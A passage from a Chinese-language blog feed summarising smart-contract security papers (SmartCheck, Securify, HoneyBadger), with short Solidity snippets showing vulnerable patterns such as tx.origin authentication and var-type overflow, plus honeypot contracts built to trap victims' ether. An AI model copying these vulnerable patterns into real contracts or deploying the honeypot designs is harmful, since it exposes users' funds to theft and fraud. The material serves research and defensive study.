tx.origin</h4><p>合约可以互相调用公共方法。Tx.origin是在调用链中的第一个账户。Msg.sender是中间的调用方。举个例子，在一个A-&gt;B-&gt;C的这样一个调用链中，从C的角度来看，tx.origin 是A,msg.sender 是B。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">pragma solidity <span class="hljs-number">0.4</span><span class="hljs-number">.19</span>;<br>contract TxWallet &#123;<br>address private owner;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">TxWallet</span> (<span class="hljs-params"></span>) </span>&#123; owner = msg.sender; &#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferTo</span>(<span class="hljs-params">address dest , uint amount</span>) <span class="hljs-title">public</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">require</span>(tx.origin == owner); <span class="hljs-comment">// authentication</span><br>dest.transfer(amount);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Transfer-forwards-all-gas"><a href="#Transfer-forwards-all-gas" class="headerlink" title="Transfer forwards all gas."></a>Transfer forwards all gas.</h4><p>Solidity提供了许多的方法来转移ether。推荐的方法是使用addr.transfer(x)，这样只会提供给被调用方2300gas的补贴。</p><h3 id="Functional-issues"><a href="#Functional-issues" class="headerlink" title="Functional issues"></a>Functional issues</h3><h4 id="Integer-division"><a href="#Integer-division" class="headerlink" title="Integer division"></a>Integer division</h4><p>整数除法：Solidity不支持浮点类型和十进制类型。整数除法的商是采用四舍五入的方法获取的。在计算ether或者令牌数量的时候特别要注意。该模式在分子和分母都为数字文字的地方检查除，也就是“/”符号。</p><h4 id="Locked-money"><a href="#Locked-money" class="headerlink" title="Locked money."></a>Locked money.</h4><p>加锁的钱：为接受ether而编写的合约应当同时完善一个撤回ether的方法，即，至少一次的transfer,send,call.value。该模式检测包含支付功能但不包含上述取款功能的合约。</p><h4 id="Unchecked-math"><a href="#Unchecked-math" class="headerlink" title="Unchecked math"></a>Unchecked math</h4><p>无检查的数学计算：solidity易出现整数的上溢和下溢。上溢将导致无法预料的、可能被恶意账户利用导致资金损失的影响。使用SafeMath library检查上溢。该模式能够检查不包含在条件语句中的算数运算“+”和“-”。由于假阳性率较高，这一条规则被暂时在第四节测试时被取消了。</p><h4 id="Timestamp-dependence"><a href="#Timestamp-dependence" class="headerlink" title="Timestamp dependence."></a>Timestamp dependence.</h4><p>时间戳的依赖：矿工可以操纵环境变量并且如果有机会从中获利的话有可能会这么做。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (now % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) winner = pl1; <span class="hljs-keyword">else</span> winner = pl2;<br></code></pre></td></tr></table></figure><h4 id="Unsafe-type-inference"><a href="#Unsafe-type-inference" class="headerlink" title="Unsafe type inference"></a>Unsafe type inference</h4><p>不安全的类型推断。Solidity支持类型推断:var i = 42中的i类型;是能够存储右侧值(uint8)的最小整数类型。类似如下循环:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123; <span class="hljs-comment">/* ... */</span> &#125;<br></code></pre></td></tr></table></figure><p>该类型的i是unit8，如果array.length的长度超过了256就会出现上溢的问题。我们需要像下例一般在声明整数变量时准确定义其类型：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; array.length; i++) &#123; <span class="hljs-comment">/*...*/</span> &#125;<br></code></pre></td></tr></table></figure><h3 id="Operational-issues"><a href="#Operational-issues" class="headerlink" title="Operational issues"></a>Operational issues</h3><h4 id="Byte-array"><a href="#Byte-array" class="headerlink" title="Byte array"></a>Byte array</h4><p>字节数组：为了更低的gas消耗，我们会尽量采用字节而不是字节数组。该模式检测字节数组的构造。</p><h4 id="Costly-loop"><a href="#Costly-loop" class="headerlink" title="Costly loop"></a>Costly loop</h4><p>高代价的循环：Ethereum是一个资源有限党的环境。每一个计算步骤的价格都要比集中式云提供商高几个数量级。此外，Ethereum 的矿工对一个区块的gas小号都有个限制。在下述例子中，如果array.length足够大，也就是函数超过了快gas的限制，调用他的事务将永远不会被确认：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">for</span> (<span class="hljs-built_in">uint</span>256 i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">array</span>.length; i++) &#123; costlyF (); &#125;<br></code></pre></td></tr></table></figure><h3 id="Developmental-issues"><a href="#Developmental-issues" class="headerlink" title="Developmental issues"></a>Developmental issues</h3><h4 id="Token-API-violation"><a href="#Token-API-violation" class="headerlink" title="Token API violation"></a>Token API violation</h4><p>违反令牌API：ERC20是实现令牌的实际标准API。Exchanges和其他第三方服务可能难以集成不符合他的令牌。对于某些返回bool的ERC20函数，不建议在期中抛出异常。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params">address _spender , uint _value</span>)</span><br><span class="hljs-function"><span class="hljs-title">returns</span> (<span class="hljs-params">bool success</span>) </span>&#123;<br><span class="hljs-built_in">require</span> (_value &lt; <span class="hljs-number">20</span> wei);<br><span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Compiler-version-not-fixed"><a href="#Compiler-version-not-fixed" class="headerlink" title="Compiler version not fixed."></a>Compiler version not fixed.</h4><p>变动的编译器版本：Solidity源文件可以表明编译器的版本</p><ul><li>建议遵循后一个示例，因为将来的编译器版本可能以开发人员没有预见到的方式处理某些语言结构。该模式检测pragma指令中的版本操作符。</li></ul><p>private modifier</p><p>私有化转换：与普遍的认知相反，私有化转换不是使一个变量不可见。挖矿者可以访问所有合约的代码和数据。开发者必须承认的是Ethereum存在着缺乏隐私的问题。该模式检测带有私有修饰符的状态变量声明。</p><h4 id="Redundant-fallback-function"><a href="#Redundant-fallback-function" class="headerlink" title="Redundant fallback function."></a>Redundant fallback function.</h4><p>冗余的回退功能：合同应该拒绝未预期的付款。在solidity 0.4.0之前，这项工作都是通过手动完成的：</p><ul><li>从solidity0.4.0开始，从solid 0.4.0开始，没有回退功能的契约将自动恢复支付，从而使上面的代码变得多余。该模式检测所描述的构造(仅当pragma指令指示编译器版本不低于0.4.0时)。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) <span class="hljs-title">payable</span> </span>&#123; <span class="hljs-keyword">throw</span>; &#125;<br></code></pre></td></tr></table></figure><h4 id="Style-guide-violation"><a href="#Style-guide-violation" class="headerlink" title="Style guide violation"></a>Style guide violation</h4><p>违反风格规范：在solidity中，function9和事件的名称通常都以小写和大写字母开头</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Foo</span>(<span class="hljs-params"></span>)</span>; <span class="hljs-comment">// bad</span><br>event logFoo (); <span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>)</span>; <span class="hljs-comment">// good</span><br>event LogFoo (); <span class="hljs-comment">// good</span><br></code></pre></td></tr></table></figure><p>Implicit visibility level</p><p>隐式能见度水平：在稳定性中，默认的函数可见性级别是public。显式定义函数可见性以防止混淆。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">/*...*/</span> &#125; <span class="hljs-comment">// bad</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125; <span class="hljs-comment">// good</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bar</span>(<span class="hljs-params"></span>) <span class="hljs-title">private</span> </span>&#123; <span class="hljs-comment">/* ... */</span> &#125; <span class="hljs-comment">// good</span><br></code></pre></td></tr></table></figure><h2 id="二、设计实现"><a href="#二、设计实现" class="headerlink" title="二、设计实现"></a>二、设计实现</h2><p>使用的是一款java系的静态分析Ethereum智能合约的工具。</p><p>SmartCheck在可靠的源代码上运行词法和句法分析，它使用了ANTLR和一套Solidity自定义的语法来生成一棵XML解析树。</p><p>通过在IR上使用XPath [xpa]查询来检测漏洞模式。因此，SmartCheck提供了全面的覆盖:分析的代码被完全转换为IR，所有元素都可以通过XPath匹配获得。行号作为XML属性存储，并帮助在源代码中本地化结果。当实现新的分析方法时，IR属性可以通过附加信息得到丰富。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201126195029.png" alt="image-20201126195029448"></p><center>Figure 1: Parse tree for the Balance equality code example</center><h2 id="三、实验评估"><a href="#三、实验评估" class="headerlink" title="三、实验评估"></a>三、实验评估</h2><p>该工具同时也可通过添加指定语法和数据库扩展支持其他智能合约。</p><p>在具体实验中，我们将SmartCheck和另外三种静态检测工具Oyente、Remix和Security进行了比较。将一个真的检测结果看作需要解决的问题。工具发现的所有问题都手工标记为true positive (TP)或false positive (FP)。</p><p>对于这四个工具(Oyente、Remix、Securify和SmartCheck)，每个工具的假阴性(false negative, FN)都是这个工具没有检测到的真实结果。对于每个工具</p><ol><li>错误发现率FDR：$FDR = \frac{FP}{TP + FP} $，是该工具的FPs数量除以该工具报告的所有问题的数量</li><li>假阴性率(False negative rate, FNR)：$FNR = \frac{FN}{TP + FN} $，是该工具的FN个数除以所有真实结果(由任何工具或手动发现)的个数</li></ol><p>其中对于3个合约Genesis、Hive和Populous的测试结果如下所示：</p><center>Table 2：Tools results on the three projects and overall</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201126195353.png" alt="image-20201126195353156"></p><h2 id="四、总结评价"><a href="#四、总结评价" class="headerlink" title="四、总结评价"></a>四、总结评价</h2><p>主要贡献；</p><ul><li>对于在solidity中已知的可靠代码问题进行了全面的概述和分类</li><li>实现了一个有效的静态分析工具SmartCheck</li></ul><p>一些不足：</p><ul><li>SmartCheck也有其自身的局限性，当检测一些错误时需要更加复杂的技术，例如污染分析或甚至人为审核。</li></ul>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Securify: Practical Security Analysis of Smart Contracts</title>
    <link href="/2020/111f0a6cc4.html"/>
    <url>/2020/111f0a6cc4.html</url>
    
    <content type="html"><![CDATA[<h1 id="Securify-Practical-security-analysis-of-smart-contracts"><a href="#Securify-Practical-security-analysis-of-smart-contracts" class="headerlink" title="Securify: Practical security analysis of smart contracts"></a>Securify: Practical security analysis of smart contracts</h1><p>论文题目：(2018-CCS)  <a href="https://dl.acm.org/doi/abs/10.1145/3243734.3243780">Securify: Practical security analysis of smart contracts</a></p><p>论文引用：Tsankov P, Dan A, Drachsler-Cohen D, et al. Securify: Practical security analysis of smart contracts[C]//Proceedings of the 2018 ACM SIGSAC Conference on Computer and Communications Security. 2018: 67-82.</p><p>代码开源： <a href="https://github.com/crytic/slither">crytic/slither</a></p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>Securify是一个全自动化，并且可扩展的分析智能合约，检测漏洞的工具。Securify基于模式匹配。其能在给定特征的情况下分析智能合约是否存在漏洞。</p><p>Securify 的分析针对字节码（bytecode），即智能合约源代码（solidity语言）被编译后的结果。通过对bytecode的分析，得出dependency graph，进而得到合约的语义信息。之后根据给定的特征分析合约语义信息是否满足遵循或违背这些特征，判断合约是否存在漏洞。</p><p>Securify的输入为智能合约的bytecode或源代码（被编译成bytecode输入工具）以及一系列模式，模式采用domain-specific language（DSL，领域特定语言）描述。输出为具体出现漏洞的位置。用户可以自己书写模式，因此Securify有可扩展性。</p><h2 id="二、MOTIVATION-EXAMPLES"><a href="#二、MOTIVATION-EXAMPLES" class="headerlink" title="二、MOTIVATION EXAMPLES"></a>二、MOTIVATION EXAMPLES</h2><h3 id="Stealing-Ether"><a href="#Stealing-Ether" class="headerlink" title="Stealing Ether"></a>Stealing Ether</h3><p>以下是一个存在漏洞的具体合约。红色标明的部分为漏洞存在的地方</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201126192221.png" alt="image-20201126192221139"></p><center>Figure 3：A vulnerable wallet that allows any user to withdrawall ether stored in it</center> <p>由于函数默认的访问限制为public，因此initWallet()函数默认可以被外部调用（向该合约发送交易），导致任何人都可以更改钱包的所有者。</p><p>Securify的模式有两大类，compliance &amp; violation；对应上述的合约，Securify可以匹配出violation pattern为owner的赋值不依赖于交易的发送者。那么对应的安全特征为owner的写入是必须受限的。</p><h3 id="Frozen-Funds"><a href="#Frozen-Funds" class="headerlink" title="Frozen Funds"></a>Frozen Funds</h3><p>deposit函数有关键字payable，表明交易发送者可以通过调用该函数来向这个合约转账。这个合约的漏洞在于，它本身没有向其他账户转账的函数，实现的功能是通过调用别的合约作为library实现的。而合约可以被销毁。那么假设有一个攻击者销毁了library，那么调用这个library来实现转账的那个合约里面的资产会被全部冻结。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201126192523.png" alt="image-20201126192450461"></p><center>Figure 4: A wallet that delegates functionality to a librarycontract walletLibrary</center> <p>匹配该漏洞的violation pattern为：</p><ol><li>用户可向合约存钱，即stop指令（调用结束指令）不依赖于转账的以太币为0（即可以向合约成功存钱）</li><li>对于所有的call指令（调用函数指令），转出的以太币为0（即合约本身没有能力向外转出钱）</li></ol><h2 id="三、THE-SECURIFY-SYSTEM"><a href="#三、THE-SECURIFY-SYSTEM" class="headerlink" title="三、THE SECURIFY SYSTEM"></a>三、THE SECURIFY SYSTEM</h2><p>本部分展示整个系统的实现：</p><ol><li>绿色部分指代输入，即EVM bytecode and security patterns</li><li>红色部分指代输出，即a violated instruction</li><li>灰色框代表中间分析工件（intermediate analysis artifacts）</li></ol><p>Securify分三个步骤进行：</p><ol><li>将合同的EVM字节码反编译（decompiles）为静态单分配形式（static-single assignment form）；</li><li>推断有关合同的语义事实（semantics facts）；</li><li>匹配合同上受限写属性（restricted write property）的违反模式（the violation pattern）。</li></ol><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201126192830.png" alt="image-20201126192828618"></p><center>Figure Figure 5: High-level flow illustrating how Securify finds the unrestricted write to the owner field of the contract</center> <h3 id="INPUTS"><a href="#INPUTS" class="headerlink" title="INPUTS"></a>INPUTS</h3><ol><li>合约的bytecode或者solidity源代码（编译成bytecode）</li><li>patterns，用DSL描述</li></ol><h4 id="Decomplie"><a href="#Decomplie" class="headerlink" title="Decomplie"></a>Decomplie</h4><p>bytecode在以太坊虚拟机EVM上运行。EVM是一个基于栈的虚拟机。</p><p>Securify将基于栈运行的bytecode转换为不基于栈的SSA表达形式，具体做法未详细给出。</p><p>之后恢复CFG，其中针对Securify的整体分析方法做了一些优化。</p><h4 id="Inferring-Semantic-Facts"><a href="#Inferring-Semantic-Facts" class="headerlink" title="Inferring Semantic Facts"></a>Inferring Semantic Facts</h4><p>该部分Securify分析合约的 semantic facts，使用Datalog描述。整个过程使用已有的Datalog Solver全自动化工具。分析包含了数据依赖和控制依赖。</p><p>首先Securify分析针对指令分析出base fact，比如说</p><blockquote><p>l1: a = 4 分析得到</p><p>assign(l1, a, 4)</p></blockquote><p>之后，分析每一个指令后，将得到的所有base facts输入到已有的工具，推断出进一步的语义信息，即semantic facts。</p><h4 id="Checking-Security-Patterns"><a href="#Checking-Security-Patterns" class="headerlink" title="Checking Security Patterns"></a>Checking Security Patterns</h4><p>patterns使用securify自己的语言描述。模式匹配时，Security 迭代指令，处理含有some和all量词的pattern，以及，为了检查推断出的facts, Securify直接向Datalog Solver查询。Securify的模式匹配局限之处为：安全特征比较宽泛，没有对具体的合约分析</p><h2 id="四、实验评估"><a href="#四、实验评估" class="headerlink" title="四、实验评估"></a>四、实验评估</h2><p>作者主要进行了一下几个实验</p><ol><li>对真实的合约做分析，评估Securify的有效性</li><li>将Securify与Oyente和Mythril（两个已有智能合约分析工具）比较<ul><li>注意Oyente和Mythril均是基于符号执行的，因此被这两个工具分析出的结果是必定会被执行到的</li></ul></li><li>评估Securify对memory和storage的分析结果</li><li>取得Securify分析时的时间和内存消耗</li></ol><p>作者使用的数据集有两个</p><ol><li>约25K的bytecode数据集（EVM dataset）</li><li>100个solidity数据集（solidity dataset）</li></ol><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201126191157.png" alt="image-20201126191157161"></p><center>Figure 11: Securify results on the EVM dataset</center><h2 id="五、总结评价"><a href="#五、总结评价" class="headerlink" title="五、总结评价"></a>五、总结评价</h2><p>主要贡献：</p><ol><li>使用反汇编Datalog描述智能合约</li><li>通过compliance 和 violation的pattrn，来检查给定安全特征是否满足</li><li>提出了Securify这个工具</li></ol><p>一些不足：</p><ol><li>Securify比已有的两个工具效果好很多，可是Securify的基本方法和这两个工具不同，比较不是很令人信服。</li></ol>]]></content>
    
    
    <categories>
      
      <category>智能合约</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Smart Contract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>The art of the scam: Demystifying honeypots in ethereum smart contracts</title>
    <link href="/2020/1140f574c1.html"/>
    <url>/2020/1140f574c1.html</url>
    
    <content type="html"><![CDATA[<h1 id="HoneyBadger"><a href="#HoneyBadger" class="headerlink" title="HoneyBadger"></a>HoneyBadger</h1><p>论文题目：(2019-USENIX)  <a href="https://arxiv.org/pdf/1902.06976.pdf">The art of the scam: Demystifying honeypots in ethereum smart contracts</a>——诈骗的艺术：以太坊智能合约中的蜜罐解谜</p><p>论文引用：Torres C F, Steichen M. The art of the scam: Demystifying honeypots in ethereum smart contracts[C]//28th {USENIX} Security Symposium ({USENIX} Security 19). 2019: 1591-1607.</p><p>代码开源： <a href="https://github.com/christoftorres/HoneyBadger">https://github.com/christoftorres/HoneyBadger</a></p><h2 id="一、主要内容"><a href="#一、主要内容" class="headerlink" title="一、主要内容"></a>一、主要内容</h2><p>本篇论文作者同是也是《 <a href="https://dl.acm.org/doi/abs/10.1145/3274694.3274737">Osiris: Hunting for integer bugs in ethereum smart contracts</a>》的作者，都是基于Oyente工具开展进一步研究。本文通过调查蜜罐智能合约的普遍性、行为和对以太坊区块链的影响，首次对蜜罐智能合约进行了系统分析。作者开发了一个蜜罐技术的分类法，并使用它来构建蜜獾———一种使用符号执行和定义良好的启发式方法来公开蜜罐的工具。</p><p>对200多万个智能合约进行了大规模的分析，结果表明，蜜獾不仅具有很高的精度，而且还具有很高的效率。具体而言，本文做出了以下贡献:</p><ol><li>对以太坊出现的一种新型欺诈蜜罐进行了第一次系统分析；</li><li>确定蜜罐使用的常见技术，并将其分类；</li><li>提供HoneyBadger——一种自动检测以太坊智能合约中的蜜罐的工具；</li></ol><h2 id="二、背景介绍"><a href="#二、背景介绍" class="headerlink" title="二、背景介绍"></a>二、背景介绍</h2><p>下面提供了蜜罐的一般定义，并介绍了作者对蜜罐的分类</p><h3 id="2-1-Honeypots（蜜罐）"><a href="#2-1-Honeypots（蜜罐）" class="headerlink" title="2.1 Honeypots（蜜罐）"></a>2.1 Honeypots（蜜罐）</h3><p>蜜罐是（Honeypot）一种智能合约，在用户向其发送资金的前提下，它假装将资金泄漏给任意用户（受害者）。然而，用户提供的资金将被困住，蜜罐创建者（攻击者）将能够取回它们。蜜罐一般分为三个阶段：</p><ol><li>攻击者部署一个看似脆弱的合约，并以资金的形式设置诱饵；</li><li>受害人试图利用合约（转移最低所需资金，但未成功）；</li><li>攻击者将诱饵连同受害者丢失的资金一起取走。</li></ol><p>攻击者不需要特殊功能就可以设置蜜罐，而只需要必要的资金来部署智能合约和放置诱饵。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113213130.png" alt="image-20201113213130688"></p><center>Figure 1  Actors and phases of a honeypot</center><h3 id="2-2-Taxonomy-of-Honeypots"><a href="#2-2-Taxonomy-of-Honeypots" class="headerlink" title="2.2  Taxonomy of Honeypots"></a>2.2  Taxonomy of Honeypots</h3><p>作者总共收集了24个蜜罐，并提取了8种不同的蜜罐技术。不同的技术按其操作级别分为三类：</p><ol><li>以太坊虚拟机</li><li>Solidity编译器</li><li>以太坊区块浏览器Etherscan</li></ol><center>Table 1 A taxonomy of honeypot techniques in Ethereumsmart contracts.</center><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113212639.png" alt="image-20201113212639615"></p><p>第一类利用EVM的异常行为欺骗用户。尽管EVM遵循一套严格且公开的规则，但用户仍然可能被存在不一致行为的智能合约所误导。</p><p>第二类涉及从Solidity编译器引入的问题。虽然有些编译器问题是众所周知的，但其他问题仍然没有记录在案，如果用户不仔细分析智能合约或不在实际条件下测试它，则可能会被忽略。</p><p>第三类与Etherscan网站上显示的有限信息相关。Etherscan可能是以太坊最著名的区块链浏览器了，许多用户完全信任其中显示的数据，而不怀好意者正好利用了这点。</p><h3 id="2-3-Honeypot-Technique"><a href="#2-3-Honeypot-Technique" class="headerlink" title="2.3 Honeypot Technique"></a>2.3 Honeypot Technique</h3><h4 id="2-3-1-Balance-Disorde"><a href="#2-3-1-Balance-Disorde" class="headerlink" title="2.3.1 Balance Disorde"></a>2.3.1 Balance Disorde</h4><p>图2 使用了一种我们称之为平衡紊乱技术（Balance Disorde）。<code>multiplicate</code>表示合约的余额(本余额)以及此函数调用的交易中包含的值(交易值)。如果此段代码中我们可以看到，函数的调用方包含的值如果大于或等于智能合约的当前余额，则余额会被传输到任意地址。</p><p>因此，居心不良的用户会相信他所需要做的，就是用一个高于当前余额的值调用这个函数，作为回报，他将收获本钱以及合约余额。但是，如果用户试图这样做，他会很快意识到第5行没有执行，因为第4行的条件不成立。原因是因为在实际执行智能合约之前，余额已随交易值递增。最后的结果只能是合约永远比你有钱。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract  MultiplicatorX3 &#123;<br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">multiplicate</span>(<span class="hljs-params">address  adr</span>) <span class="hljs-title">payable</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (msg.value  &gt;= <span class="hljs-built_in">this</span>.balance)<br>            adr.transfer(<span class="hljs-built_in">this</span>.balance+msg.value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><center>Figure 2: An example of a balance disorder honeypot</center><h4 id="2-3-2-Inheritance-Disorder"><a href="#2-3-2-Inheritance-Disorder" class="headerlink" title="2.3.2 Inheritance  Disorder"></a>2.3.2 Inheritance  Disorder</h4><p>有一个继承自合同Ownable的合同KingOfTheHill：函数takeAll只允许变量拥有者中存储的地址提取合同余额，但可以通过调用消息值大于当前值的回退函数来修改owner变量。</p><p>现在，如果用户试图调用函数以将自己设置为所有者，则交易成功。但是，如果他或她后来试图收回余额，交易失败。原因是在第9行声明的变量所有者与在第2行声明的变量所有者不同。调用者希望第9行的所有者将被第2行的所有者覆盖，但事实并非如此。Solidity编译器将这两个变量视为不同的变量，因此在第9行写入调用者也不会导致修改合约Ownable中定义所有者。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript">contract  Ownable &#123;<br>    address  owner = msg.sender;<br>    modifier  onlyOwner &#123;<br>        <span class="hljs-built_in">require</span>(msg.sender  ==  owner);<br>        _;<br>    &#125;<br>&#125;<br>contract  KingOfTheHill  is  Ownable &#123;<br>    address  public  owner;<br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)  <span class="hljs-title">public</span>  <span class="hljs-title">payable</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(msg.value &gt;jackpot)owner=msg.sender;<br>        jackpot  += msg.value;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">takeAll</span> (<span class="hljs-params"></span>)  <span class="hljs-title">public</span>  <span class="hljs-title">onlyOwner</span> </span>&#123;<br>        msg.sender.transfer(<span class="hljs-built_in">this</span>.balance);<br>        jackpot = <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Figure 3: An example of an inheritance disorder honeypot</p><h4 id="2-3-3-Skip-Empty-String-Literal"><a href="#2-3-3-Skip-Empty-String-Literal" class="headerlink" title="2.3.3 Skip  Empty  String  Literal"></a>2.3.3 Skip  Empty  String  Literal</h4><p>跳跃空字符串文本.所示的合同允许用户通过向合同的功能投资发送最小数量的以太币来进行投资。所示的合约允许投资者可以通过调用剥离功能来撤回投资。</p><p>从代码上来看没有什么能阻止投资者剥离比最初投资额更大的资产，有些天真的用户认为可以利用剥离的功能。但是实际上Solidity编译器的编码器将跳过函数loggedtranfer（第14行）参数提供的空字符串文本。</p><p>其效果是，此参数之后的所有参数的编码向左移动32字节，因此函数调用参数msg接收target的值，而target被赋予currentOwner的值，最后currentOwner接收默认值零。因此，最终loggedtranfer函数执行到currentOwner而不是target。用户试图利用智能合约的明显漏洞，最后却将投资转移给合约所有者。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113214321.png"></p><center>Figure 4: An example of a skip empty string literal honeypot.</center><h4 id="2-3-4-Type-Deduction-Overflow"><a href="#2-3-4-Type-Deduction-Overflow" class="headerlink" title="2.3.4 Type Deduction Overflow"></a>2.3.4 Type Deduction Overflow</h4><p>在Solidity中，当将变量声明为类型var时，编译器使用类型演绎法从分配给该变量的第一个表达式中自动推断出可能的最小类型。下图描述了一个蜜罐示例，它使用了一种我们称为类型演绎法溢出的技术。最初，合约表明用户可以将投资翻番。</p><p>但是变量i的类型为uint8，该类型的最大值为255，小于2*msg . value（2 * 0.1 ether = 2 * 1017 wei）。因此第7行的循环将是无限的。尽管如此，如果变量multi小于amountToTransfer，循环仍然可以停止。这是可能的，因为amountToTransfer被赋值为multi，multi最终在第8行发生整数溢出，将小于amountToTransfer，一旦循环退出，合约将会将一个值返还给访问者，尽管其金额最多为255 wei（以太币的最小子面值为1 ether=10^18 wei），因此远远低于用户最初投资的价值，访问者亏大了。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113214343.png" alt="image-20201113214343780"></p><center>Figure 5:  An example of a type deduction overflow honey-pot.<h4 id="2-3-5-Uninitialised-Struct"><a href="#2-3-5-Uninitialised-Struct" class="headerlink" title="2.3.5 Uninitialised  Struct"></a>2.3.5 Uninitialised  Struct</h4><p>未初始化结构蜜罐。为了收回合约的余额，合约要求用户要支付一笔以太币并猜测合约中存储的随机数。然而，任何用户都可以很容易地获得随机数的值，因为存储在区块链上的每个数据都是公开可用的。用户只需从区块链中读取随机数，然后通过支付以太币并提供正确的数字来调用函数guessNumber。</p><p>但是，结构没有像受害者想象的那样通过关键字正确初始化。结果，Solidity编译器将结构（player）中包含的第一个变量的存储位置映射到合约（randomNumber）中包含的第一个变量的存储位置，从而用调用方的地址覆盖随机数，致使第14行的条件失败。值得注意的是，蜜罐创建者知道用户可能试图猜测覆盖的值。因此，创建者在第10行这儿将数字限制在1到10之间，这大大减少了用户生成满足此条件的地址的机会。</p><p><img src="https://aliyun-typora-img.oss-cn-beijing.aliyuncs.com/imgs/20201113221924.png" alt="image-20201113221924467"></p><center>Figure 6: An example of an uninitialised struct honeypot.<h4 id="2-3-6-Hidden-State-Update"><a href="#2-3-6-Hidden-State-Update" class="headerlink" title="2.3.6 Hidden State Update"></a>2.3.6 Hidden State 